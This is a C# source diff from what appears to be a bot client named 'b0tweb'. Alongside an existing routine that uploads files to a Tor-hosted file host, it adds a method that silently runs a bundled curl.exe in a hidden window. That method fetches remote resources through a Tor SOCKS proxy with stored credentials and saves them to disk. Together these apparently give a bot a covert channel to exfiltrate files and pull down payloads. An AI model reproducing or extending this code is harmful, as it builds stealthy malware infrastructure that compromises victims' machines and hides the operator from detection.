@@ -8,7 +8,7 @@ namespace b0tweb
     /// <summary>
     /// Upload a file to a private Pomf Clone.
     /// </summary>
-    class HTTPUpload
+    class HTTPHelper
     {
         /// <summary>
         /// Upload a file to the hosted pomf clone on Tor.
@@ -58,6 +58,43 @@ namespace b0tweb
             {
                 return e.Message;
             }
+        }
+
+        /// <summary>
+        /// Download a given resource to a location.
+        /// </summary>
+        /// <param name="url">Resource URL to fetch.</param>
+        /// <param name="location">Download location on a local or network disk.</param>
+        /// <returns>Exit code from Curl</returns>
+        public static int Download(string url, string location)
+        {
+            string argument = String.Format(
+                 "--socks5-hostname {0}:{1} {2} --user {3}:{4} -o {5}",
+                TorProxy.Host,
+                TorProxy.Port,
+                url,
+                Configuration.HTTPUsername,
+                Configuration.HTTPPassword,
+                location
+            );
+
+            ProcessStartInfo info = new ProcessStartInfo(FileHelper.GetBasePath() + @"\Curl\curl.exe", argument)
+            {
+                RedirectStandardOutput = true,
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden
+            };
+
+            Process process = new Process()
+            {
+                StartInfo = info
+            };
+
+            process.Start();
+            process.WaitForExit();
+
+            return process.ExitCode;
         }
     }
 }
